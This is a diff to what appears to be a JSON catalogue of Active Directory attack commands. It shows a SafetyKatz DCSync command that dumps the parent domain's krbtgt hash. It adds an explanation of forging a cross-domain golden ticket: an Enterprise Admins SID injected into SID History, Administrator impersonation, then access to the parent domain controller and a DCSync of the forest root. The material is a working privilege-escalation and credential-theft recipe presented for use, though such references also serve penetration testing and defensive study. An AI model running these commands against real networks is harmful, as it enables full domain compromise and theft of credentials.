@@ -144,5 +144,6 @@
       "label": "DCSync parent forest root after escalation",
       "command": "SafetyKatz.exe \"lsadump::dcsync /user:<parent_domain>\\krbtgt /domain:<parent_domain>\" \"exit\""
     }
-  ]
+  ],
+  "explain": "Forges a cross-domain golden ticket that escalates from a child domain to the forest root:\n  golden                    forge a TGT offline\n  /rc4:<nt_hash>            the child domain's krbtgt hash (from DCSync)\n  /domain:<domain> /sid:<domain_sid>   the child domain and its SID\n  /sids:<parent_enterprise_admin_sid>  the parent Enterprise Admins SID (ends -519) injected into SID History\n  /user:Administrator /ptt  impersonate Administrator and inject the ticket\nSID History is not filtered inside a forest, so the ticket is honored on the parent DC - dir \\\\<parent_dc>\\C$ then DCSync the root."
 }
